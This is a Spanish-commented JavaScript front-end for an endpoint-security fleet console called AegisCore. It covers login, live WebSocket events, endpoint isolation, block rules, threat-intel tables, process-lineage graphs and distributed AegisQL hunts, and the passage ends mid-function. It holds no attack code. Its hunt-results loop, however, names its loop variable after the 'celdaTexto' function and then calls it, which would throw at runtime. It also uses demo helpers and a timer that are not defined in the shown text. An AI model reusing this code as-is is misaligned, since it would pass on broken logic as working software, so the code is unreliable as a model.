// Consola de flota de AegisCore.
//
// Modulo ES nativo, sin dependencias ni paso de construccion. Lo que se lee
// aqui es exactamente lo que ejecuta el navegador del operador.
//
// La consola tiene dos fuentes de datos y hace falta entender por que:
//
//   - REST, para el ESTADO: inventario, alertas, reglas. Se pide al abrir una
//     vista y cuando algo la invalida.
//   - WebSocket, para los SUCESOS: una alerta que entra, un endpoint que late,
//     una regla que se publica. Llegan solos, en el instante en que ocurren.
//
// Un panel que solo sondeara llegaria tarde a lo unico que importa. Uno que
// solo escuchara sucesos no sabria pintar nada al abrirse.

'use strict';

// ── Estado de la aplicacion ─────────────────────────────────────────────
const app = {
  token: sessionStorage.getItem('aegis_token') || null,
  usuario: sessionStorage.getItem('aegis_usuario') || null,
  vista: 'topologia',
  agentes: new Map(),   // cn -> vista del agente
  grafoActual: null,
  ws: null,
  reintento: 0,
  seleccionado: null,
  // Caceria que se esta mirando ahora mismo.
  caza: null,
  // Modo demostracion: datos sinteticos, sin backend. Se activa desde el acceso
  // y NO afecta a la sesion real; solo cambia de donde salen los datos.
  demo: false,
};

const $ = (sel) => document.querySelector(sel);
const $$ = (sel) => Array.from(document.querySelectorAll(sel));

// ── Cliente de la API ───────────────────────────────────────────────────

/** Llama a la API con la sesion actual; si caduca, vuelve al acceso. */
async function api(ruta, opciones = {}) {
  // En demostracion no se llama a la red: se responde con datos sinteticos, con
  // la misma forma que devolveria el servidor, para que TODA la consola se pinte
  // igual sin backend. Ver `datosDemo`.
  if (app.demo) return datosDemo(ruta, opciones);
  const cab = Object.assign({}, opciones.headers || {});
  if (app.token) cab['Authorization'] = 'Bearer ' + app.token;
  if (opciones.body) cab['Content-Type'] = 'application/json';

  const r = await fetch(ruta, Object.assign({}, opciones, { headers: cab }));
  if (r.status === 401) {
    // La sesion ya no vale: no tiene sentido seguir pintando datos viejos.
    cerrarSesionLocal();
    throw new Error('sesión caducada');
  }
  if (r.status === 204) return null;
  const cuerpo = await r.json().catch(() => ({}));
  if (!r.ok) {
    const e = new Error(cuerpo.error || ('HTTP ' + r.status));
    // El analizador de AegisQL devuelve la consulta con el tramo culpable
    // subrayado y una sugerencia. Perderlo aqui dejaria al analista con un
    // "error de sintaxis" a secas, que es lo que se queria evitar.
    if (cuerpo.detalle) e.detalle = cuerpo.detalle;
    if (cuerpo.sugerencia) e.sugerencia = cuerpo.sugerencia;
    throw e;
  }
  return cuerpo;
}

// ── Acceso ──────────────────────────────────────────────────────────────

$('#form-acceso').addEventListener('submit', async (e) => {
  e.preventDefault();
  const usuario = $('#usuario').value.trim();
  const clave = $('#clave').value;
  const err = $('#error-acceso');
  err.hidden = true;
  try {
    const r = await api('/api/sesion', { method: 'POST', body: JSON.stringify({ usuario, clave }) });
    $('#clave').value = '';
    app.token = r.token;
    app.usuario = usuario;
    sessionStorage.setItem('aegis_token', r.token);
    sessionStorage.setItem('aegis_usuario', usuario);
    entrar();
  } catch (ex) {
    err.textContent = ex.message;
    err.hidden = false;
  }
});

$('#salir').addEventListener('click', async () => {
  try { await api('/api/sesion', { method: 'DELETE' }); } catch (_) { /* da igual */ }
  cerrarSesionLocal();
});

function cerrarSesionLocal() {
  app.token = null;
  app.usuario = null;
  app.demo = false;
  const cinta = $('#demo-cinta'); if (cinta) cinta.hidden = true;
  if (demoTimer) { clearInterval(demoTimer); demoTimer = null; }
  sessionStorage.removeItem('aegis_token');
  sessionStorage.removeItem('aegis_usuario');
  if (app.ws) { app.ws.close(); app.ws = null; }
  $('#consola').hidden = true;
  $('#acceso').hidden = false;
}

function entrar() {
  $('#acceso').hidden = true;
  $('#consola').hidden = false;
  $('#quien').textContent = app.usuario || '';
  abrirTiempoReal();
  refrescarTodo();
}

// ── Canal en tiempo real ────────────────────────────────────────────────

function abrirTiempoReal() {
  if (!app.token) return;
  // En demostracion no hay canal real: se marca conectado y se simulan sucesos.
  if (app.demo) { marcarEnlace(true); simularActividadDemo(); return; }
  const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
  const url = `${proto}//${location.host}/api/ws?token=${encodeURIComponent(app.token)}`;
  const ws = new WebSocket(url);
  app.ws = ws;

  ws.onopen = () => {
    app.reintento = 0;
    marcarEnlace(true);
  };

  ws.onmessage = (ev) => {
    let m;
    try { m = JSON.parse(ev.data); } catch (_) { return; }
    manejarEvento(m);
  };

  ws.onclose = () => {
    marcarEnlace(false);
    if (!app.token) return;
    // Reintento con espera creciente y tope: una caida del servidor no debe
    // convertir cada consola abierta en una fuente de trafico en bucle.
    app.reintento = Math.min(app.reintento + 1, 6);
    const espera = Math.min(1000 * 2 ** app.reintento, 30000);
    setTimeout(abrirTiempoReal, espera);
  };

  ws.onerror = () => ws.close();
}

function marcarEnlace(vivo) {
  const el = $('#enlace');
  el.classList.toggle('conectado', vivo);
  el.classList.toggle('desconectado', !vivo);
  el.querySelector('b').textContent = vivo ? 'en vivo' : 'reconectando';
}

/** Aplica un suceso recibido por el canal. */
function manejarEvento(m) {
  switch (m.tipo) {
    case 'instantanea':
      pintarKpis(m.resumen);
      break;

    case 'desincronizada':
      // Se perdieron sucesos: en vez de seguir con un estado incompleto, se
      // vuelve a pedir todo.
      registrarActividad('canal', `se perdieron ${m.perdidos} sucesos; resincronizando`);
      refrescarTodo();
      break;

    case 'latido': {
      const a = app.agentes.get(m.cn);
      if (a) {
        a.rss_kb = m.rss_kb;
        a.amenazas_activas = m.amenazas;
        a.ultimo_latido = new Date().toISOString();
        a.en_linea = true;
        if (app.vista === 'topologia') pintarFlota();
      } else {
        cargarFlota();
      }
      break;
    }

    case 'agente_enrolado':
      registrarActividad('enrolado', `${m.hostname} se enroló en la flota`);
      cargarFlota();
      break;

    case 'alerta_nueva':
      registrarActividad('alerta',
        `[sev ${m.severidad}] ${m.categoria} en ${corto(m.cn)}` +
        (m.tecnica_mitre ? ` (${m.tecnica_mitre})` : ''));
      subirPin();
      if (app.vista === 'alertas') cargarAlertas();
      cargarResumen();
      break;

    case 'aislamiento_cambiado':
      registrarActividad('aislamiento',
        `${corto(m.cn)} ${m.aislado ? 'AISLADO' : 'liberado'} por ${m.por}`);
      cargarFlota();
      cargarResumen();
      break;

    case 'politica_publicada':
      registrarActividad('politica',
        `política v${m.version} publicada (${m.reglas} regla(s) activas)`);
      cargarResumen();
      if (app.vista === 'reglas') cargarReglas();
      break;

    case 'inteligencia_nueva':
      registrarActividad('canal', `${m.objetos} objeto(s) STIX de ${corto(m.cn)}`);
      if (app.vista === 'inteligencia') cargarStix();
      break;

    case 'caza_lanzada':
      registrarActividad('caza',
        `caza lanzada por ${m.por} a ${m.objetivo} endpoint(s)`);
      if (app.vista === 'caza') cargarCacerias();
      break;

    case 'correlacion_abierta':
      // Solo llega cuando la correlacion se ABRE por primera vez. El motor
      // evalua cada minuto y la evidencia sigue en la ventana: avisar en cada
      // vuelta convertiria una campana de tres dias en cuatro mil avisos
      // identicos, y una consola que avisa cuatro mil veces de lo mismo deja
      // de mirarse.
      registrarActividad('campana',
        `${m.patron}: ${m.endpoints} endpoints — ${m.clave}` +
        (m.tecnica_mitre ? ` (${m.tecnica_mitre})` : ''));
      pinCampanas += 1;
      { const p = $('#pin-campanas'); p.textContent = pinCampanas; p.hidden = false; }
      if (app.vista === 'campanas') cargarCampanas();
      break;

    case 'caza_respuesta':
      // Se refresca por CADA respuesta y no al terminar: una caceria sobre diez
      // mil endpoints se ve llegar. Solo se toca la pantalla si el analista
      // esta mirando ESA caceria; si no, seria repintar por nada.
      if (m.error) {
        registrarActividad('caza', `${corto(m.cn)} no pudo: ${m.error}`);
      } else if (m.coincidencias > 0) {
        registrarActividad('caza',
          `${corto(m.cn)}: ${m.coincidencias} coincidencia(s)`);
      }
      if (app.vista === 'caza' && app.caza === m.caza_id) verCaza(m.caza_id);
      break;
  }
}

function corto(cn) { return cn.length > 22 ? cn.slice(0, 22) + '…' : cn; }

function registrarActividad(clase, texto) {
  const ul = $('#actividad');
  const li = document.createElement('li');
  li.className = clase;
  const hora = new Date().toLocaleTimeString('es-ES', { hour12: false });
  li.innerHTML = `<span class="hora">${hora}</span> `;
  li.appendChild(document.createTextNode(texto));
  ul.prepend(li);
  // La barra lateral es una ventana a lo que pasa ahora, no un historico: el
  // historico esta en la base de datos y se consulta en las tablas.
  while (ul.children.length > 60) ul.lastChild.remove();
}

let pinAlertas = 0;
function subirPin() {
  if (app.vista === 'alertas') return;
  pinAlertas++;
  const p = $('#pin-alertas');
  p.textContent = pinAlertas;
  p.hidden = false;
}

let pinCampanas = 0;

// ── Navegacion ──────────────────────────────────────────────────────────

$('#pestanas').addEventListener('click', (e) => {
  const b = e.target.closest('button[data-vista]');
  if (!b) return;
  app.vista = b.dataset.vista;
  $$('#pestanas button').forEach((x) => x.classList.toggle('activa', x === b));
  $$('.vista').forEach((v) => { v.hidden = v.id !== 'vista-' + app.vista; });
  if (app.vista === 'alertas') { pinAlertas = 0; $('#pin-alertas').hidden = true; }
  if (app.vista === 'campanas') { pinCampanas = 0; $('#pin-campanas').hidden = true; }
  refrescarVista();
});

function refrescarTodo() {
  cargarResumen();
  cargarFlota();
  refrescarVista();
}

function refrescarVista() {
  if (app.vista === 'alertas') cargarAlertas();
  else if (app.vista === 'reglas') cargarReglas();
  else if (app.vista === 'inteligencia') cargarStix();
  else if (app.vista === 'linaje') cargarGrafos();
  else if (app.vista === 'caza') cargarCacerias();
  else if (app.vista === 'campanas') cargarCampanas();
}

// ── Indicadores ─────────────────────────────────────────────────────────

async function cargarResumen() {
  try { pintarKpis(await api('/api/resumen')); } catch (_) { /* ya avisado */ }
}

function pintarKpis(r) {
  if (!r) return;
  $('#k-total').textContent = r.agentes_total;
  $('#k-linea').textContent = r.agentes_en_linea;
  $('#k-aislados').textContent = r.agentes_aislados;
  $('#k-abiertas').textContent = r.alertas_abiertas;
  $('#k-criticas').textContent = r.alertas_criticas;
  $('#k-politica').textContent = 'v' + r.version_politica;
}

// ── Topologia ───────────────────────────────────────────────────────────

async function cargarFlota() {
  try {
    const lista = await api('/api/agentes?limite=1000');
    app.agentes = new Map(lista.map((a) => [a.cn, a]));
    if (app.vista === 'topologia') pintarFlota();
  } catch (_) { /* ya avisado */ }
}

$('#solo-problemas').addEventListener('change', pintarFlota);

function pintarFlota() {
  const rejilla = $('#rejilla-flota');
  const soloProblemas = $('#solo-problemas').checked;
  rejilla.textContent = '';

  let agentes = Array.from(app.agentes.values());
  if (soloProblemas) {
    agentes = agentes.filter((a) => !a.en_linea || a.aislado || a.amenazas_activas > 0);
  }
  $('#flota-vacia').hidden = agentes.length > 0;

  // Lo que exige atencion, primero: aislados, luego amenazados, luego caidos.
  agentes.sort((a, b) => rango(b) - rango(a) || a.hostname.localeCompare(b.hostname));

  for (const a of agentes) {
    const el = document.createElement('div');
    el.className = 'nodo ' + claseNodo(a);
    el.tabIndex = 0;
    const visto = a.ultimo_latido
      ? new Date(a.ultimo_latido).toLocaleTimeString('es-ES', { hour12: false })
      : 'nunca';
    el.innerHTML =
      `<div class="host"></div><div class="cn"></div>` +
      `<div class="metricas"><span>RSS ${Math.round(a.rss_kb / 1024)} MB</span>` +
      `<span>${a.amenazas_activas} amenaza(s)</span><span>${visto}</span></div>` +
      (a.aislado ? '<span class="etiqueta">AISLADO</span>' : '');
    // textContent y no innerHTML para el hostname y el CN: los declara el
    // endpoint, y un endpoint comprometido no va a inyectar marcado en la
    // consola de quien lo investiga.
    el.querySelector('.host').textContent = a.hostname || '(sin nombre)';
    el.querySelector('.cn').textContent = a.cn;
    el.addEventListener('click', () => abrirEndpoint(a.cn));
    rejilla.appendChild(el);
  }
}

function rango(a) {
  if (a.aislado) return 3;
  if (a.amenazas_activas > 0) return 2;
  if (!a.en_linea) return 1;
  return 0;
}

function claseNodo(a) {
  if (a.aislado) return 'aislado';
  if (a.amenazas_activas > 0) return 'amenazado';
  return a.en_linea ? 'en-linea' : 'caido';
}

// ── Respuesta de un clic ────────────────────────────────────────────────

async function abrirEndpoint(cn) {
  let a;
  try { a = await api('/api/agentes/' + encodeURIComponent(cn)); }
  catch (ex) { return alert(ex.message); }

  app.seleccionado = a;
  $('#modal-titulo').textContent = a.hostname || a.cn;
  const dl = $('#modal-datos');
  dl.textContent = '';
  const filas = [
    ['Identidad (CN)', a.cn],
    ['Versión del agente', a.version_agente],
    ['Estado', a.en_linea ? 'en línea' : 'sin latidos'],
    ['Aislado', a.aislado ? 'sí' : 'no'],
    ['Memoria', Math.round(a.rss_kb / 1024) + ' MB'],
    ['Amenazas activas', String(a.amenazas_activas)],
    ['Latidos / eventos', `${a.latidos} / ${a.eventos}`],
    ['Política aplicada', 'v' + a.version_politica],
  ];
  for (const [k, v] of filas) {
    const dt = document.createElement('dt'); dt.textContent = k;
    const dd = document.createElement('dd'); dd.textContent = v;
    dl.append(dt, dd);
  }
  $('#modal-aviso').textContent = a.aislado
    ? 'Este endpoint está aislado: sigue reportando, pero su política local le corta el resto de la red.'
    : 'Aislar corta la conectividad de red del endpoint salvo con el plano de control. El agente lo aplica en su próximo contacto; queda registrado con tu usuario.';
  $('#btn-aislar').hidden = a.aislado;
  $('#btn-liberar').hidden = !a.aislado;
  $('#modal').hidden = false;
}

$('#btn-cerrar').addEventListener('click', () => { $('#modal').hidden = true; });
$('#modal').addEventListener('click', (e) => { if (e.target.id === 'modal') $('#modal').hidden = true; });

$('#btn-aislar').addEventListener('click', () => responder('aislar'));
$('#btn-liberar').addEventListener('click', () => responder('liberar'));

async function responder(accion) {
  const a = app.seleccionado;
  if (!a) return;
  // Una accion que corta la red de una maquina de produccion se confirma. No
  // por burocracia: por un clic de mas en la tarjeta equivocada.
  const texto = accion === 'aislar'
    ? `¿Aislar «${a.hostname || a.cn}» de la red?`
    : `¿Devolver «${a.hostname || a.cn}» a la red?`;
  if (!confirm(texto)) return;
  try {
    await api(`/api/agentes/${encodeURIComponent(a.cn)}/${accion}`, { method: 'POST' });
    $('#modal').hidden = true;
    cargarFlota();
  } catch (ex) { alert(ex.message); }
}

// ── Alertas ─────────────────────────────────────────────────────────────

$('#solo-abiertas').addEventListener('change', cargarAlertas);

async function cargarAlertas() {
  const abiertas = $('#solo-abiertas').checked;
  let lista;
  try { lista = await api(`/api/alertas?limite=300&abiertas=${abiertas}`); }
  catch (_) { return; }

  const tb = $('#tabla-alertas').querySelector('tbody');
  tb.textContent = '';
  $('#alertas-vacio').hidden = lista.length > 0;

  for (const x of lista) {
    const tr = document.createElement('tr');
    tr.appendChild(celda(`<span class="sev sev-${x.severidad}">${x.severidad}</span>`, true));
    tr.appendChild(celdaTexto(corto(x.cn_agente), 'mono'));
    tr.appendChild(celdaTexto(x.categoria));
    tr.appendChild(celda(x.tecnica_mitre
      ? `<span class="tecnica">${escape(x.tecnica_mitre)}</span> ${escape(x.tactica_mitre || '')}`
      : '<span style="color:var(--texto-2)">sin mapeo</span>', true));
    tr.appendChild(celdaTexto(x.descripcion));
    tr.appendChild(celdaTexto(new Date(x.recibido_en).toLocaleString('es-ES', { hour12: false })));
    tb.appendChild(tr);
  }
}

function celdaTexto(texto, clase) {
  const td = document.createElement('td');
  if (clase) td.className = clase;
  td.textContent = texto;   // nunca innerHTML con datos del endpoint
  return td;
}
function celda(html, confiable) {
  const td = document.createElement('td');
  if (confiable) td.innerHTML = html; else td.textContent = html;
  return td;
}
function escape(s) {
  return String(s).replace(/[&<>"']/g, (c) =>
    ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));
}

// ── Linaje de procesos ──────────────────────────────────────────────────

async function cargarGrafos() {
  let lista;
  try { lista = await api('/api/grafos?limite=100'); } catch (_) { return; }
  const sel = $('#selector-grafo');
  sel.textContent = '';
  if (lista.length === 0) {
    const o = document.createElement('option');
    o.textContent = 'sin linajes capturados';
    sel.appendChild(o);
    $('#lienzo-arbol').textContent = '';
    return;
  }
  for (const g of lista) {
    const o = document.createElement('option');
    o.value = g.id;
    o.textContent = `${new Date(g.recibido_en).toLocaleString('es-ES', { hour12: false })}` +
      ` · ${corto(g.cn_agente)} · ${g.nodos} nodo(s)`;
    sel.appendChild(o);
  }
  sel.value = app.grafoActual || lista[0].id;
  dibujarGrafo(sel.value);
}

$('#selector-grafo').addEventListener('change', (e) => dibujarGrafo(e.target.value));

async function dibujarGrafo(id) {
  if (!id) return;
  app.grafoActual = id;
  let datos;
  try { datos = await api('/api/grafos/' + encodeURIComponent(id)); } catch (_) { return; }
  pintarArbol(datos.nodos);
}

/**
 * Dibuja el arbol de linaje en SVG.
 *
 * La disposicion es por niveles: la profundidad manda en el eje vertical y los
 * hermanos se reparten en el horizontal. Para un linaje de procesos —pocos
 * nodos, muy jerarquico— eso se lee de un vistazo, que es de lo que se trata.
 */
function pintarArbol(nodos) {
  const lienzo = $('#lienzo-arbol');
  lienzo.textContent = '';
  $('#detalle-nodo').hidden = true;
  if (!nodos || nodos.length === 0) return;

  const ANCHO = 240, ALTO = 46, SEP_X = 24, SEP_Y = 74, MARGEN = 24;

  // Agrupar por profundidad, respetando el orden que envio el servidor.
  const niveles = new Map();
  for (const n of nodos) {
    if (!niveles.has(n.profundidad)) niveles.set(n.profundidad, []);
    niveles.get(n.profundidad).push(n);
  }
  const profundidades = Array.from(niveles.keys()).sort((a, b) => a - b);

  const pos = new Map();
  let anchoTotal = 0;
  for (const d of profundidades) {
    const fila = niveles.get(d);
    const ancho = fila.length * ANCHO + (fila.length - 1) * SEP_X;
    anchoTotal = Math.max(anchoTotal, ancho);
    fila.forEach((n, i) => {
      pos.set(String(n.clave), {
        x: MARGEN + i * (ANCHO + SEP_X),
        y: MARGEN + profundidades.indexOf(d) * SEP_Y,
        n,
      });
    });
  }

  const w = anchoTotal + MARGEN * 2;
  const h = profundidades.length * SEP_Y + MARGEN * 2;
  const NS = 'http://www.w3.org/2000/svg';
  const svg = document.createElementNS(NS, 'svg');
  svg.setAttribute('width', Math.max(w, 600));
  svg.setAttribute('height', h);

  // Aristas primero, para que queden por debajo de las cajas.
  for (const { x, y, n } of pos.values()) {
    const p = pos.get(String(n.padre));
    if (!p) continue;
    const path = document.createElementNS(NS, 'path');
    const x1 = p.x + ANCHO / 2, y1 = p.y + ALTO;
    const x2 = x + ANCHO / 2, y2 = y;
    const ym = (y1 + y2) / 2;
    path.setAttribute('d', `M${x1},${y1} C${x1},${ym} ${x2},${ym} ${x2},${y2}`);
    path.setAttribute('class', 'arista');
    svg.appendChild(path);
  }

  for (const { x, y, n } of pos.values()) {
    const g = document.createElementNS(NS, 'g');

    const caja = document.createElementNS(NS, 'rect');
    caja.setAttribute('x', x); caja.setAttribute('y', y);
    caja.setAttribute('width', ANCHO); caja.setAttribute('height', ALTO);
    let clase = 'caja-proc';
    if (n.taints !== 0) clase += ' contaminado';
    if (n.puntuacion >= 70) clase += ' raiz';
    caja.setAttribute('class', clase);
    g.appendChild(caja);

    const nombre = document.createElementNS(NS, 'text');
    nombre.setAttribute('x', x + 10); nombre.setAttribute('y', y + 19);
    nombre.setAttribute('class', 'txt-proc');
    nombre.textContent = recortar(n.imagen.split('/').pop() || n.imagen, 26);
    g.appendChild(nombre);

    const pid = document.createElementNS(NS, 'text');
    pid.setAttribute('x', x + 10); pid.setAttribute('y', y + 35);
    pid.setAttribute('class', 'txt-pid');
    pid.textContent = `pid ${n.pid} · clave ${n.clave}`;
    g.appendChild(pid);

    if (n.puntuacion > 0) {
      const s = document.createElementNS(NS, 'text');
      s.setAttribute('x', x + ANCHO - 10); s.setAttribute('y', y + 19);
      s.setAttribute('text-anchor', 'end');
      s.setAttribute('class', 'txt-score');
      s.setAttribute('fill', n.puntuacion >= 70 ? 'var(--grave)' : 'var(--aviso)');
      s.textContent = n.puntuacion;
      g.appendChild(s);
    }

    g.addEventListener('click', () => detallarNodo(n));
    svg.appendChild(g);
  }

  lienzo.appendChild(svg);
}

function recortar(s, max) { return s.length > max ? s.slice(0, max - 1) + '…' : s; }

function detallarNodo(n) {
  const d = $('#detalle-nodo');
  d.textContent = '';
  const filas = [
    ['imagen', n.imagen],
    ['línea de comandos', n.cmdline],
    ['clave estable', String(n.clave)],
    ['pid', String(n.pid)],
    ['padre / creador', `${n.padre} / ${n.creador}`],
    ['profundidad', String(n.profundidad)],
    ['marcas de contaminación', '0b' + (n.taints >>> 0).toString(2)],
    ['puntuación', String(n.puntuacion)],
    ['estado', n.terminado_ns ? 'terminado' : 'vivo al capturar'],
  ];
  for (const [k, v] of filas) {
    const linea = document.createElement('div');
    const et = document.createElement('span');
    et.style.color = 'var(--texto-2)';
    et.textContent = k + ': ';
    linea.appendChild(et);
    linea.appendChild(document.createTextNode(v));
    d.appendChild(linea);
  }
  d.hidden = false;
}

// ── Reglas globales ─────────────────────────────────────────────────────

const CAMPO_DE_TIPO = {
  bloquear_puerto: ['puerto', 'número', (v) => ({ puerto: Number(v) })],
  bloquear_hash: ['sha256', '64 hex', (v) => ({ sha256: v })],
  bloquear_proceso: ['imagen', '/ruta/absoluta', (v) => ({ imagen: v })],
  bloquear_red: ['cidr', '10.0.0.0/8', (v) => ({ cidr: v })],
  aislar_por_puntuacion: ['umbral', '1..1000', (v) => ({ umbral: Number(v) })],
};

$('#r-tipo').addEventListener('change', (e) => {
  const [, ejemplo] = CAMPO_DE_TIPO[e.target.value];
  $('#r-valor').placeholder = ejemplo;
  $('#r-valor').value = '';
});

$('#form-regla').addEventListener('submit', async (e) => {
  e.preventDefault();
  const err = $('#error-regla');
  err.hidden = true;
  const tipo = $('#r-tipo').value;
  const [, , construir] = CAMPO_DE_TIPO[tipo];
  try {
    await api('/api/reglas', {
      method: 'POST',
      body: JSON.stringify({
        nombre: $('#r-nombre').value.trim(),
        tipo,
        parametros: construir($('#r-valor').value.trim()),
        severidad: Number($('#r-sev').value),
      }),
    });
    $('#r-nombre').value = ''; $('#r-valor').value = '';
    cargarReglas();
  } catch (ex) {
    // El servidor valida y explica la CONSECUENCIA, no solo el rango: se
    // muestra tal cual, que es lo util para quien la escribe.
    err.textContent = ex.message;
    err.hidden = false;
  }
});

async function cargarReglas() {
  let lista;
  try { lista = await api('/api/reglas'); } catch (_) { return; }
  const tb = $('#tabla-reglas').querySelector('tbody');
  tb.textContent = '';
  for (const r of lista) {
    const tr = document.createElement('tr');
    tr.appendChild(celda(r.activa
      ? '<span class="sev sev-2">ON</span>'
      : '<span class="sev sev-0">off</span>', true));
    tr.appendChild(celdaTexto(r.nombre));
    tr.appendChild(celdaTexto(r.tipo));
    tr.appendChild(celdaTexto(JSON.stringify(r.parametros), 'mono'));
    tr.appendChild(celda(`<span class="sev sev-${r.severidad}">${r.severidad}</span>`, true));
    tr.appendChild(celdaTexto(r.creada_por));

    const td = document.createElement('td');
    const alternar = document.createElement('button');
    alternar.className = 'secundario';
    alternar.textContent = r.activa ? 'Desactivar' : 'Activar';
    alternar.addEventListener('click', async () => {
      try {
        await api(`/api/reglas/${r.id}/activa`, {
          method: 'POST', body: JSON.stringify({ activa: !r.activa }),
        });
        cargarReglas();
      } catch (ex) { alert(ex.message); }
    });
    const borrar = document.createElement('button');
    borrar.className = 'secundario';
    borrar.textContent = 'Borrar';
    borrar.style.marginLeft = '6px';
    borrar.addEventListener('click', async () => {
      if (!confirm(`¿Retirar la regla «${r.nombre}» de toda la flota?`)) return;
      try {
        await api('/api/reglas/' + r.id, { method: 'DELETE' });
        cargarReglas();
      } catch (ex) { alert(ex.message); }
    });
    td.append(alternar, borrar);
    tr.appendChild(td);
    tb.appendChild(tr);
  }
}

// ── Inteligencia ────────────────────────────────────────────────────────

async function cargarStix() {
  let lista;
  try { lista = await api('/api/stix/objetos?limite=200'); } catch (_) { return; }
  const tb = $('#tabla-stix').querySelector('tbody');
  tb.textContent = '';
  $('#stix-vacio').hidden = lista.length > 0;
  for (const o of lista) {
    const tr = document.createElement('tr');
    tr.appendChild(celdaTexto(String(o.avistamientos)));
    tr.appendChild(celdaTexto(o.tipo));
    tr.appendChild(celdaTexto(recortar(o.id, 44), 'mono'));
    const c = o.contenido || {};
    tr.appendChild(celdaTexto(recortar(c.pattern || c.command_line || c.name || '—', 60)));
    tr.appendChild(celdaTexto(new Date(o.ultima_vez).toLocaleString('es-ES', { hour12: false })));
    tb.appendChild(tr);
  }
}

// ── Arranque ────────────────────────────────────────────────────────────

$('#r-valor').placeholder = CAMPO_DE_TIPO.bloquear_puerto[1];
if (app.token) entrar(); else $('#acceso').hidden = false;


// ── Caza distribuida (AegisQL) ──────────────────────────────────────────

/** Lanza una caceria a toda la flota. */
$('#form-caza').addEventListener('submit', async (e) => {
  e.preventDefault();
  const ql = $('#caza-ql').value.trim();
  if (!ql) return;

  const err = $('#caza-error');
  err.hidden = true;
  $('#btn-cazar').disabled = true;
  try {
    const r = await api('/api/cacerias', {
      method: 'POST',
      body: JSON.stringify({ consulta: ql }),
    });
    app.caza = r.id;
    // El coste lo calcula el planificador del servidor: avisar antes de que el
    // analista se pregunte por que su caceria tarda.
    if (r.coste === 'caro') {
      registrarActividad('caza',
        'consulta cara: puede tardar en una flota grande');
    }
    await cargarCacerias();
    await verCaza(r.id);
  } catch (e) {
    // El error del analizador trae la posicion y una sugerencia. Se muestra tal
    // cual lo dibuja el servidor, con el subrayado bajo el tramo culpable: es
    // mucho mas util que "error de sintaxis".
    err.textContent = e.detalle || e.message;
    err.hidden = false;
  } finally {
    $('#btn-cazar').disabled = false;
  }
});

/** Cacerias recientes. */
async function cargarCacerias() {
  let lista = [];
  try { lista = await api('/api/cacerias?limite=20'); } catch { return; }

  const cuerpo = $('#tabla-cacerias tbody');
  cuerpo.textContent = '';
  for (const c of lista) {
    const tr = document.createElement('tr');
    tr.append(
      celdaTexto(new Date(c.lanzada_en).toLocaleTimeString()),
      celdaTexto(c.consulta.length > 70 ? c.consulta.slice(0, 70) + '…' : c.consulta),
      celdaTexto(c.lanzada_por),
      celdaTexto(String(c.objetivo)),
    );
    const acciones = document.createElement('td');
    const ver = document.createElement('button');
    ver.className = 'secundario';
    ver.textContent = 'Ver';
    ver.addEventListener('click', () => verCaza(c.id));
    acciones.append(ver);
    tr.append(acciones);
    cuerpo.append(tr);
  }
}

/** Pinta el resumen agregado y las filas de una caceria. */
async function verCaza(id) {
  let d;
  try { d = await api('/api/cacerias/' + id + '?limite=500'); } catch { return; }
  app.caza = id;
  $('#caza-ql').value = d.caza.consulta;

  const r = d.resumen;
  $('#cz-respondieron').textContent = r.respondieron;
  $('#cz-objetivo').textContent = d.caza.objetivo;
  $('#cz-hallazgos').textContent = r.con_hallazgos;
  $('#cz-coincidencias').textContent = r.coincidencias;
  $('#cz-inaccesibles').textContent = r.inaccesibles;
  $('#cz-agotados').textContent = r.agotados;
  $('#caza-resumen').hidden = false;

  // Cabecera: el endpoint primero, porque en una caza distribuida la pregunta
  // "donde" es tan importante como "que".
  const cab = $('#caza-cabecera');
  cab.textContent = '';
  cab.append(th('Endpoint'));
  for (const c of d.caza.columnas) cab.append(th(c));

  const cuerpo = $('#tabla-caza tbody');
  cuerpo.textContent = '';
  let filas = 0;
  for (const resp of d.respuestas) {
    for (const fila of resp.filas) {
      const tr = document.createElement('tr');
      tr.append(celdaTexto(corto(resp.cn_agente)));
      for (const celdaTexto of fila) tr.append(celdaTexto(celdaTexto));
      cuerpo.append(tr);
      filas++;
    }
  }
  $('#tabla-caza').hidden = filas === 0;
  $('#caza-vacio').hidden = filas !== 0;
}

/** Esquema de AegisQL, servido por el binario que valida las consultas. */
$('#btn-esquema').addEventListener('click', async () => {
  let e;
  try { e = await api('/api/aegisql/esquema'); } catch { return; }
  const cuerpo = $('#esquema-cuerpo');
  cuerpo.textContent = '';
  for (const t of e.tablas) {
    const h = document.createElement('h4');
    h.textContent = t.nombre;
    const p = document.createElement('p');
    p.className = 'nota';
    p.textContent = t.descripcion;
    const tabla = document.createElement('table');
    tabla.className = 'tabla';
    const thead = document.createElement('thead');
    const trh = document.createElement('tr');
    trh.append(th('Columna'), th('Tipo'), th('Coste'), th('Qué es'));
    thead.append(trh);
    const tbody = document.createElement('tbody');
    for (const c of t.columnas) {
      const tr = document.createElement('tr');
      tr.append(celdaTexto(c.nombre), celdaTexto(c.tipo), celdaTexto(c.coste), celdaTexto(c.descripcion));
      tbody.append(tr);
    }
    tabla.append(thead, tbody);
    cuerpo.append(h, p, tabla);
  }
  $('#modal-esquema').hidden = false;
});

$('#btn-cerrar-esquema').addEventListener('click', () => {
  $('#modal-esquema').hidden = true;
});

/** Celda de encabezado. */
function th(texto) {
  const e = document.createElement('th');
  e.textContent = texto;
  return e;
}

// ── Campanas distribuidas (FASE 45) ─────────────────────────────────────

async function cargarCampanas() {
  let lista = [];
  try { lista = (await api('/api/correlaciones?limite=50')).correlaciones; }
  catch { return; }

  const tb = $('#tabla-campanas tbody');
  tb.textContent = '';
  $('#campanas-vacio').hidden = lista.length > 0;

  for (const c of lista) {
    const tr = document.createElement('tr');
    if (c.severidad >= 4) tr.classList.add('critica');
    tr.append(
      celdaTexto(c.patron),
      // La clave la escribe, indirectamente, un endpoint potencialmente
      // comprometido: se pinta con textContent, nunca con innerHTML.
      celdaTexto(c.clave, 'mono'),
      celdaTexto(String(c.endpoints)),
      celdaTexto(String(c.alertas)),
      celdaTexto(c.tecnica_mitre || '—'),
      celdaTexto(new Date(c.primera_en).toLocaleString('es-ES', { hour12: false })),
    );
    const td = document.createElement('td');
    const b = document.createElement('button');
    b.className = 'secundario';
    b.textContent = 'Ver evidencia';
    b.addEventListener('click', () => verCampana(c));
    td.appendChild(b);
    tr.appendChild(td);
    tb.appendChild(tr);
  }
}

/// Muestra la evidencia materializada de una campana.
async function verCampana(c) {
  app.campana = c.id;
  $('#campana-detalle').hidden = false;
  // textContent y no innerHTML: la clave viene de un endpoint.
